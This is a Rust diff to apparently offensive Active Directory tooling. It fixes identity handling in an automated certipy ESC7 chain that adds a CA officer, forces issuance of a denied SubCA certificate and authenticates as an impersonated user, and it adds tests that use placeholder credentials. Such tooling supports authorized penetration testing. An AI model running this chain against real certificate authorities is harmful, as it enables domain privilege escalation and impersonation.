@@ -485,11 +485,36 @@ pub fn build_certipy_retrieve_command(args: &Value) -> Result<CommandBuilder> {
         .timeout_secs(120))
 }
 
+/// The sAMAccountName half of `user`, which may arrive bare or as a UPN.
+fn bare_sam(user: &str) -> &str {
+    user.split('@').next().unwrap_or(user)
+}
+
+/// Compose the identity `certipy -username` binds as.
+///
+/// `auth_domain` is the realm that issued `username`, which is not always the
+/// realm the CA lives in — see `certipy_esc7_full_chain`. A `username` that
+/// already carries a realm is trusted as given.
+fn esc7_auth_identity(username: &str, auth_domain: &str) -> String {
+    if username.contains('@') {
+        username.to_string()
+    } else {
+        format!("{username}@{auth_domain}")
+    }
+}
+
 /// Run the full ESC7 exploitation chain: add officer → request SubCA cert
 /// (gets denied) → issue the pending request → retrieve cert → authenticate.
 ///
 /// Required args: `username`, `domain`, `password`, `dc_ip`, `ca`
-/// Optional args: `target` (CA server IP), `upn`, `sid`
+/// Optional args: `target` (CA server IP), `auth_domain`, `upn`, `sid`
+///
+/// `domain` is the CA's domain: it scopes the impersonated `upn` and the
+/// realm the certificate is minted in. `auth_domain` is the realm that issued
+/// `username`, and is what the credential must bind as — a trust-sourced
+/// credential from a child domain binds as `user@child`, never `user@parent`,
+/// so composing both from `domain` yields `invalidCredentials (data 52e)`
+/// before the chain's first step can run. Defaults to `domain`.
 pub async fn certipy_esc7_full_chain(args: &Value) -> Result<ToolOutput> {
     let username = required_str(args, "username")?;
     let domain = required_str(args, "domain")?;
@@ -503,6 +528,9 @@ pub async fn certipy_esc7_full_chain(args: &Value) -> Result<ToolOutput> {
         .or_else(|| optional_str(args, "ca_host"))
         .or_else(|| optional_str(args, "target_ip"));
     let sid = optional_str(args, "sid");
+    let auth_domain = optional_str(args, "auth_domain")
+        .filter(|d| !d.trim().is_empty())
+        .unwrap_or(domain);
 
     let upn_full = if upn.contains('@') {
         upn.clone()
@@ -510,7 +538,8 @@ pub async fn certipy_esc7_full_chain(args: &Value) -> Result<ToolOutput> {
         format!("{upn}@{domain}")
     };
 
-    let user_at_domain = format!("{username}@{domain}");
+    let user_at_domain = esc7_auth_identity(username, auth_domain);
+    let officer_sam = bare_sam(username);
     let mut outputs = Vec::new();
 
     let mut step1_cmd = certipy("ca")
@@ -518,7 +547,7 @@ pub async fn certipy_esc7_full_chain(args: &Value) -> Result<ToolOutput> {
         .flag("-password", password)
         .flag("-dc-ip", dc_ip)
         .flag("-ca", ca)
-        .flag("-add-officer", username);
+        .flag("-add-officer", officer_sam);
     if let Some(t) = &target {
         step1_cmd = step1_cmd.flag("-target", *t);
     }
@@ -1416,6 +1445,49 @@ mod tests {
             "dc_ip": "192.168.58.10"
         });
         assert!(required_str(&args, "username").is_err());
+    }
+
+    // --- certipy_esc7_full_chain identity composition ---
+
+    #[test]
+    fn esc7_binds_a_trust_sourced_credential_in_its_own_realm() {
+        assert_eq!(
+            super::esc7_auth_identity("carol", "child.contoso.local"),
+            "carol@child.contoso.local"
+        );
+    }
+
+    #[test]
+    fn esc7_auth_domain_defaults_to_the_ca_domain() {
+        let args = json!({
+            "username": "carol",
+            "domain": "contoso.local",
+            "password": "P@ssw0rd!",
+            "dc_ip": "192.168.58.10",
+            "ca": "CONTOSO-CA"
+        });
+        let auth_domain = optional_str(&args, "auth_domain")
+            .filter(|d| !d.trim().is_empty())
+            .unwrap_or(required_str(&args, "domain").expect("domain present"));
+        assert_eq!(auth_domain, "contoso.local");
+        assert_eq!(
+            super::esc7_auth_identity("carol", auth_domain),
+            "carol@contoso.local"
+        );
+    }
+
+    #[test]
+    fn esc7_keeps_a_realm_the_caller_already_supplied() {
+        assert_eq!(
+            super::esc7_auth_identity("carol@child.contoso.local", "contoso.local"),
+            "carol@child.contoso.local"
+        );
+    }
+
+    #[test]
+    fn esc7_add_officer_takes_the_bare_sam_account_name() {
+        assert_eq!(super::bare_sam("carol@child.contoso.local"), "carol");
+        assert_eq!(super::bare_sam("carol"), "carol");
     }
 
     #[test]
